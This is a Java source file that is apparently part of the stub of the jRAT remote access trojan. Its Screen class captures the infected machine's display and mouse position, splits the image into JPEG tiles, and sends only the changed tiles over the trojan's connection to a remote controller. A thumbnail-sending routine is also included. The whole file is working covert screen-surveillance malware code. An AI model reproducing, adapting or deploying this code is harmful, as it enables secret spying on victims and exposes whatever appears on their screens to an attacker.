package io.jrat.stub;

import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import io.jrat.stub.packets.outgoing.Packet17RemoteScreen;
import io.jrat.stub.packets.outgoing.Packet33Thumbnail;
import io.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
import io.jrat.stub.utils.ImageUtils;

import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.PointerInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Iterator;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;

public class Screen implements Runnable {

	public static Screen instance;

	private int size;
	private int quality;
	private int monitor;	
	private int rows;
	private int columns;
	
    private static int[] prevSums = new int[0];


	public Screen(int size, int quality, int monitor, int columns, int rows) {
		Screen.instance = this;
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
		this.columns = columns;
		this.rows = rows;
	}

    public static int calculateSum(BufferedImage image) {
        int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
        int sum = 0;
        for (int x = 0; x < image.getWidth(); x += 16) {
            for (int y = 0; y < image.getHeight(); y += 16) {
                sum += pixels[(y * image.getWidth() + x) * 3 + 0];
                sum += pixels[(y * image.getWidth() + x) * 3 + 1];
                sum += pixels[(y * image.getWidth() + x) * 3 + 2];
            }
        }
        return sum;
    }


	@Override
	public void run() {
        long start = System.currentTimeMillis();
        long end = System.currentTimeMillis();

		try {
			double scaledSize = size / 100D;

			BufferedImage image;
			Rectangle screenBounds;

			if (monitor == -1) {
				Robot robot = new Robot();
				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				image = robot.createScreenCapture(screenBounds);
			} else {
				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
				Robot robot = new Robot(screen);
				screenBounds = screen.getDefaultConfiguration().getBounds();
				screenBounds.x = 0;
				screenBounds.y = 0;
				image = robot.createScreenCapture(screenBounds);
			}

			if (scaledSize == 0D) {
				scaledSize = 0.1D;
			}


			if (scaledSize != 1.0D) {
				image = ImageUtils.resize(image, scaledSize);
			}

			PointerInfo a = MouseInfo.getPointerInfo();
			Point b = a.getLocation();
			int mouseX = (int) b.getX();
			int mouseY = (int) b.getY();

			int scaledMouseX = (int) (mouseX * scaledSize);
			int scaledMouseY = (int) (mouseY * scaledSize);

			AbstractOutgoingPacket packet;
			
            int chunkWidth = image.getWidth() / columns;
            int chunkHeight = image.getHeight() / rows;
            int count = 0;
            int pieceNumber = 0;

            BufferedImage imgs[] = new BufferedImage[columns * rows];
            
            if (prevSums.length != columns * rows) {
                prevSums = new int[columns * rows];
            }
            

            
            for (int x = 0; x < rows; x++) {
                for (int y = 0; y < columns; y++) {
                    BufferedImage i;
                    imgs[count] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());
                    Graphics2D gr = imgs[count++].createGraphics();
                    gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);               
                    gr.dispose();
                    
                    
                    ByteArrayOutputStream bss = new ByteArrayOutputStream();
                    ImageOutputStream baos = ImageIO.createImageOutputStream(bss);
                    Iterator<ImageWriter> iter = ImageIO.getImageWritersByFormatName("jpeg");
                    ImageWriter writer = iter.next();
                    ImageWriteParam iwp = writer.getDefaultWriteParam();
                    iwp.setCompressionMode(2);
                    iwp.setCompressionQuality(quality / 10F);
                    writer.setOutput(baos);
                    writer.write(null, new IIOImage(i, null, null), iwp);
                    writer.dispose();
                    byte[] buffer = bss.toByteArray();

                    boolean doit = false;

                    int sum = calculateSum(i);                
                    int prev = prevSums[pieceNumber];       
        
                    if (sum != prev) {
                        doit = true;

                    }
                    
                    prevSums[pieceNumber] = sum;

                    pieceNumber++;

                    if (doit) {
                        packet = new Packet17RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);
                        
                        /*if (repeat) {
            				packet = new Packet17RemoteScreen(x, y, buffer);
            			} else {
            				packet = new Packet18OneRemoteScreen(array, scaledWidth, scaledHeight);
            			}*/

            			packet.send(Connection.dos, Connection.sw);

                    }
                  
                }
            }
            
            new Packet68RemoteScreenComplete(scaledMouseX, scaledMouseY).send(Connection.dos, Connection.sw);

			

		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
        end = System.currentTimeMillis();
        
        System.out.println("Took " + (end - start) + " ms");

		instance = null;
	}

	public static void sendThumbnail() {
		try {
			Connection.addToSendQueue(new Packet33Thumbnail());
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

}
